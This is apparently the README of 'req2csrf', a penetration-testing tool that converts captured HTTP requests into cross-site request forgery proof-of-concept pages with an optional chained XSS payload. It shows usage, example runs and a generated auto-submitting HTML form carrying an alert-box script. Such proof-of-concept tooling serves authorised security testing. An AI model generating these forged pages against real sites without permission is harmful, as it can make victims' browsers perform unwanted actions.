# req2csrf

This is a simple tool that automates the exploitation of cross-site request forgery (CSRF) and reflected cross-site scripting (XSS) vulnerabilities.

## How to use

```
$ python3 .\req2csrf.py -h

   _____  _____ _____  ______
  / ____|/ ____|  __ \|  ____|
 | |    | (___ | |__) | |__
 | |     \___ \|  _  /|  __|
 | |____ ____) | | \ \| |
  \_____|_____/|_|  \_\_|
                  _       _ _        _   _               _              _
                 | |     (_) |      | | (_)             | |            | |
   _____  ___ __ | | ___  _| |_ __ _| |_ _  ___  _ __   | |_ ___   ___ | |
  / _ \ \/ / '_ \| |/ _ \| | __/ _` | __| |/ _ \| '_ \  | __/ _ \ / _ \| |
 |  __/>  <| |_) | | (_) | | || (_| | |_| | (_) | | | | | || (_) | (_) | |
  \___/_/\_\ .__/|_|\___/|_|\__\__,_|\__|_|\___/|_| |_|  \__\___/ \___/|_|
           | |
           |_|                               v0.2 (pre-release) by Qurius


usage: req2csrf.py [-h] [-r REQUEST] [-c] [-p PLACEHOLDER] [-x PAYLOAD] [-a] [-o OUTPUT]

HTTP requests to CSRF PoC converter

optional arguments:
  -h, --help            show this help message and exit
  -r REQUEST, --request REQUEST
                        HTTP request file path
  -c, --chain           Chain SSRF and XSS
  -p PLACEHOLDER, --placeholder PLACEHOLDER
                        GET/POST parameter to place the XSS payload to
  -x PAYLOAD, --payload PAYLOAD
                        XSS payload to use
  -a, --autosubmit      CSRF payload will be executed automatically, no interaction required (default: button)
  -o OUTPUT, --output OUTPUT
                        Output file path (default: STDOUT)
```

## Examples:

Generate malicious HTML and inject XSS payload to the specified GET/POST parameter and save to a file.

```
$ python3 .\req2csrf.py -r request.txt -o csrf.html -a --chain -p 'username' -x '<script>alert(1)</script>'

   _____  _____ _____  ______
  / ____|/ ____|  __ \|  ____|
 | |    | (___ | |__) | |__
 | |     \___ \|  _  /|  __|
 | |____ ____) | | \ \| |
  \_____|_____/|_|  \_\_|
                  _       _ _        _   _               _              _
                 | |     (_) |      | | (_)             | |            | |
   _____  ___ __ | | ___  _| |_ __ _| |_ _  ___  _ __   | |_ ___   ___ | |
  / _ \ \/ / '_ \| |/ _ \| | __/ _` | __| |/ _ \| '_ \  | __/ _ \ / _ \| |
 |  __/>  <| |_) | | (_) | | || (_| | |_| | (_) | | | | | || (_) | (_) | |
  \___/_/\_\ .__/|_|\___/|_|\__\__,_|\__|_|\___/|_| |_|  \__\___/ \___/|_|
           | |
           |_|                               v0.2 (pre-release) by Qurius


[i] Input file: request.txt
[i] Output file: csrf.html
[i] Chaining SSRF and XSS: True
[i] Submit form automatically: True

[+] Succesfully parsed request parameters
[+] XSS payload injected
[+] Succesfully generated malicious HTML

[+] Output file saved to: csrf.html
```

Generate malicious HTML and inject XSS payload to the specified GET/POST parameter and save to a STDOUT.

```
$ python3 .\req2csrf.py -r request.txt -a --chain -p 'username' -x '<script>alert(1)</script>'

   _____  _____ _____  ______
  / ____|/ ____|  __ \|  ____|
 | |    | (___ | |__) | |__
 | |     \___ \|  _  /|  __|
 | |____ ____) | | \ \| |
  \_____|_____/|_|  \_\_|
                  _       _ _        _   _               _              _
                 | |     (_) |      | | (_)             | |            | |
   _____  ___ __ | | ___  _| |_ __ _| |_ _  ___  _ __   | |_ ___   ___ | |
  / _ \ \/ / '_ \| |/ _ \| | __/ _` | __| |/ _ \| '_ \  | __/ _ \ / _ \| |
 |  __/>  <| |_) | | (_) | | || (_| | |_| | (_) | | | | | || (_) | (_) | |
  \___/_/\_\ .__/|_|\___/|_|\__\__,_|\__|_|\___/|_| |_|  \__\___/ \___/|_|
           | |
           |_|                               v0.3 (pre-release) by Qurius


[i] Input file: request.txt
[i] Output file: STDOUT
[i] Chaining SSRF and XSS: True
[i] Submit form automatically: True

[+] Succesfully parsed request parameters
[+] XSS payload injected
[+] Succesfully generated malicious HTML

[*] Output:

<!DOCTYPE html>
<html lang="en">

<!-- Auto-generated by req2csrf tool v0.3 by Qurius https://github.com/qur1us/req2csrf -->

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF demonstration</title>
</head>
<body>
    <h1>CSRF demonstration</h1>
    <form action="https://qurius-security.com/req2csrf.php" method="POST">
        <input type="hidden" id="username" name="username" value="&lt;script&gt;alert(1)&lt;/script&gt;">
                <input type="hidden" id="password" name="password" value="req2csrf">

        <input type="submit" value="Submit">
    </form>
    <script>var form = document.querySelector("form");form.submit();</script>
</body>
</html>
```
